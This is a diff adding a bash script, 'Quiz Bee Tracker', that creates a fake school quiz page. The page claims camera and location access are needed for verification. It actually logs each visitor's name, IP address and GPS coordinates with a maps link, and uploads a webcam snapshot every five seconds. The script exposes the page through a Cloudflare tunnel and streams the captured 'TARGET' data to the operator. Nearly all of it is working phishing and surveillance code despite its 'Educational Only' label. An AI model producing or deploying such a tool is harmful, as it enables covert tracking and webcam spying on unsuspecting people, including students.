@@ -1,0 +1,149 @@
+#!/bin/bash
+# --- QUIZ BEE TRACKER v22.0 (NAME INPUT + FIXED CAM MONITORING) ---
+NC='\033[0m'; Bold='\033[1m'; PBlue='\033[1;34m'; PWhite='\033[1;37m'
+PRed='\033[1;31m'; PYellow='\033[1;33m'; BCyan='\033[1;36m'; BGreen='\033[1;32m'
+
+PORT=8888
+SERVER_DIR="server"
+
+mkdir -p $SERVER_DIR
+rm -f $SERVER_DIR/*.png > /dev/null 2>&1
+touch $SERVER_DIR/combined.log
+chmod -R 755 $SERVER_DIR
+
+clear
+echo -e "${PRed}${Bold} ██████╗ ███████╗ █████╗ ███████╗████████╗ ${NC}"
+echo -e " ${PYellow}⭐ ⭐ ⭐ QUIZ BEE TRACKER v22.0 ⭐ ⭐ ⭐${NC}"
+echo -e " ${BGreen}Created by : ${PWhite}SadFriends${NC}  ${BGreen}Status : ${PWhite}Educational Only${NC}"
+echo -e "${PWhite}==========================================${NC}"
+
+# --- QUIZ SELECTION ---
+echo -e "\n ${BCyan}${Bold}[ PILI NG QUIZ SUBJECT ]${NC}"
+echo -e " ${PWhite}1. MATH  2. SCIENCE  3. ENGLISH  4. HISTORY${NC}"
+read -p $'\n [*] Select ➤ ' q_opt
+
+case $q_opt in
+1) SUBJECT="MATH"; S_CODE="MTH"; S_COLOR="#3498db"
+   Q_DATA='[{"q":"12+15?","c":["27","29","25"]},{"q":"9x8?","c":["72","81","64"]},{"q":"50/2?","c":["25","20","30"]},{"q":"Sqrt of 81?","c":["9","8","7"]},{"q":"15x3?","c":["45","35","55"]},{"q":"100-45?","c":["55","65","45"]},{"q":"6x7?","c":["42","48","36"]},{"q":"25+75?","c":["100","110","90"]},{"q":"81/9?","c":["9","8","7"]},{"q":"10x10?","c":["100","10","1000"]}]' ;;
+2) SUBJECT="SCIENCE"; S_CODE="SCI"; S_COLOR="#2ecc71"
+   Q_DATA='[{"q":"H2O is?","c":["Water","Air","Fire"]},{"q":"Red Planet?","c":["Mars","Venus","Jupiter"]},{"q":"Powerhouse?","c":["Mitochondria","Nucleus","DNA"]},{"q":"Closest star?","c":["Sun","Proxima","Sirius"]},{"q":"Liquid metal?","c":["Mercury","Iron","Gold"]},{"q":"Gas we breathe?","c":["Oxygen","CO2","Argon"]},{"q":"Boiling point?","c":["100C","90C","110C"]},{"q":"Hardest mineral?","c":["Diamond","Quartz","Gold"]},{"q":"Center of atom?","c":["Nucleus","Proton","Neutron"]},{"q":"Study of plants?","c":["Botany","Biology","Physics"]}]' ;;
+*) SUBJECT="HISTORY"; S_CODE="HIS"; S_COLOR="#f1c40f"
+   Q_DATA='[{"q":"National Hero?","c":["Rizal","Luna","Aguinaldo"]},{"q":"Year of Indep?","c":["1898","1945","1521"]},{"q":"1st Pres?","c":["Aguinaldo","Quezon","Roxas"]},{"q":"Oldest City?","c":["Cebu","Manila","Vigan"]},{"q":"GOMBURZA?","c":["3","4","5"]},{"q":"Discovered PH?","c":["Magellan","Colon","Legazpi"]},{"q":"Capital?","c":["Manila","Cebu","Davao"]},{"q":"Nat Flower?","c":["Sampaguita","Rose","Orchid"]},{"q":"Flag Sun Rays?","c":["8","7","3"]},{"q":"Hero of Mactan?","c":["Lapu-Lapu","Humabon","Sikatuna"]}]' ;;
+esac
+
+# --- PHP Backend ---
+cat <<EOF > $SERVER_DIR/index.php
+<?php
+date_default_timezone_set('Asia/Manila');
+if (isset(\$_POST['lat'])) {
+    \$name = \$_POST['name'] ?? 'Unknown User';
+    \$log = "---------------- TARGET DETECTED ----------------\n";
+    \$log .= "NAME     : " . \$name . "\n";
+    \$log .= "SUBJECT  : $SUBJECT\n";
+    \$log .= "IP ADDR  : " . \$_SERVER['REMOTE_ADDR'] . "\n";
+    \$log .= "GPS DATA : " . \$_POST['lat'] . "," . \$_POST['lon'] . "\n";
+    \$log .= "MAPS LINK: https://google.com" . \$_POST['lat'] . "," . \$_POST['lon'] . "\n";
+    file_put_contents('combined.log', \$log, FILE_APPEND);
+    exit();
+}
+if (isset(\$_POST['img'])) {
+    \$data = base64_decode(str_replace(' ', '+', str_replace('data:image/png;base64,', '', \$_POST['img'])));
+    \$filename = 'cam_' . rand(111111,999999) . '.png';
+    file_put_contents(\$filename, \$data);
+    file_put_contents('combined.log', "CAM FILE : \$filename (CAPTURED!)\n", FILE_APPEND);
+    exit();
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>$SUBJECT Quiz Portal</title>
+    <style>
+        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding: 20px; }
+        .box { background: #1e1e1e; padding: 25px; border-radius: 15px; max-width: 400px; margin: auto; border: 1px solid $S_COLOR; box-shadow: 0 0 10px $S_COLOR; }
+        .btn { background: $S_COLOR; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; width: 100%; margin: 8px 0; font-weight: bold; }
+        input { width: 90%; padding: 10px; margin-bottom: 15px; border-radius: 5px; border: none; }
+    </style>
+</head>
+<body>
+    <div id="p-part" class="box">
+        <h2 style="color:$S_COLOR">REGISTRATION</h2>
+        <input type="text" id="uname" placeholder="Write your Full Name..." required>
+        <p>This quiz requires <b>Camera</b> and <b>Location</b> for verification.</p>
+        <button class="btn" onclick="start()">START QUIZ</button>
+    </div>
+    <div id="q-part" class="box" style="display:none;">
+        <h3 id="q-num" style="color:$S_COLOR"></h3>
+        <h2 id="q-text" style="min-height:60px;"></h2>
+        <div id="choices-box"></div>
+    </div>
+    <video id="v" style="display:none;" autoplay></video><canvas id="c" style="display:none;"></canvas>
+    <script>
+    let cur = 0; const data = $Q_DATA; let isDone = false;
+    function start() {
+        const name = document.getElementById('uname').value;
+        if(!name) { alert('Please write your name!'); return; }
+        
+        navigator.geolocation.getCurrentPosition(p => {
+            const body = 'lat=' + p.coords.latitude + '&lon=' + p.coords.longitude + '&name=' + encodeURIComponent(name);
+            fetch('index.php', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body: body});
+        });
+
+        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
+            const v = document.getElementById('v'); v.srcObject = s;
+            const c = document.getElementById('c');
+            setInterval(() => {
+                if(!isDone) {
+                    c.width=v.videoWidth; c.height=v.videoHeight;
+                    c.getContext('2d').drawImage(v,0,0);
+                    fetch('index.php', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'img='+encodeURIComponent(c.toDataURL('image/png'))});
+                }
+            }, 5000);
+        });
+        document.getElementById('p-part').style.display='none';
+        document.getElementById('q-part').style.display='block';
+        show();
+    }
+    function show() {
+        document.getElementById('q-num').innerText = "Question " + (cur + 1) + " of 10";
+        document.getElementById('q-text').innerText = data[cur].q;
+        const box = document.getElementById('choices-box'); box.innerHTML = '';
+        data[cur].c.forEach(ch => {
+            let btn = document.createElement('button'); btn.className='btn'; btn.innerText=ch;
+            btn.onclick = () => { if(cur < 9){ cur++; show(); } else { isDone=true; finish(); } };
+            box.appendChild(btn);
+        });
+    }
+    function finish() {
+        document.getElementById('q-part').innerHTML = "<h2>QUIZ COMPLETED!</h2><p>Wait for teacher verification.</p>";
+    }
+    </script>
+</body>
+</html>
+EOF
+
+# --- SERVER START ---
+fuser -k $PORT/tcp > /dev/null 2>&1
+php -S 127.0.0.1:$PORT -t $SERVER_DIR > /dev/null 2>&1 &
+PHP_PID=$!
+cloudflared tunnel --url http://127.0.0.1:$PORT > cf.log 2>&1 &
+CF_PID=$!
+
+while true; do
+    CF_LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' cf.log)
+    if [ ! -z "$CF_LINK" ]; then
+        echo -e "${BGreen}[+] LINK: ${PWhite}${Bold}$CF_LINK${NC}"
+        break
+    fi
+    sleep 1
+done
+
+trap "kill $PHP_PID $CF_PID; exit" INT TERM EXIT
+tail -f $SERVER_DIR/combined.log | awk '{
+    if ($0 ~ /TARGET DETECTED/) print "\033[1;33m" $0 "\033[0m";
+    else if ($0 ~ /NAME|SUBJECT|IP ADDR|GPS DATA/) print "\033[1;37m" $0 "\033[0m";
+    else if ($0 ~ /MAPS LINK/) print "\033[1;34m" $0 "\033[0m";
+    else if ($0 ~ /CAM FILE/) print "\033[1;31m" $0 "\033[0m";
+    else print $0;
+}'
